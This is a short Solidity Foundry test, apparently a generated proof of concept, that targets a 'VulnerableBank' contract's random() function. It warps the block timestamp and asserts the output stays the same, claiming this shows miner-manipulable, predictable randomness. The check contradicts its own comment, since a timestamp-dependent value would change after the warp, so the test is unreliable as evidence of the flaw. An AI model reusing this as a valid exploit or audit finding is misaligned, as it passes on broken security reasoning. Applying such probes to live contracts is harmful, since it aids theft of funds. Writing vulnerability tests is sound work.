// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./basetest.sol";
import "../src/49356772-e930-4cfa-8409-e51abe2c6e55_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        uint256 initialRandomNumber = target.random();

        // Introduce a scenario where miners intentionally manipulate block timestamps
        vm.warp(block.timestamp + 200); // Move timestamp 200 seconds forward

        vm.prank(attacker);
        uint256 manipulatedRandomNumber = target.random();

        // Assert that the random numbers are the same, indicating predictability
        assertEq(initialRandomNumber, manipulatedRandomNumber);
    }
}